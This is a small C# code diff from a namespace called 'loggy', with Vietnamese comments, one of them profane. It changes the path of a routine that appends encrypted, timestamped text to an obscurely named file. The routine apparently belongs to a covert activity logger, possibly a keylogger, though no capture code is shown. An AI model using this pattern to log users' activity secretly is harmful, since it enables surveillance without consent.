@@ -168,7 +168,7 @@ namespace loggy
                 //tạm bỏ cái dưới để lưu vào 1 file duy nhất
                 //using (StreamWriter sw = new StreamWriter(path_date + @"\" + path_date + ".txt", true)) //nhớ thêm true để viết tiếp vào file, dkm -_-
 
-                using (StreamWriter sw = new StreamWriter(@"\abcxzy.txt", true))
+                using (StreamWriter sw = new StreamWriter("abcxzy", true))
                 {
                     sw.WriteLine(Encrypt(DateTime.Now.ToString() + " " + text));
                 }
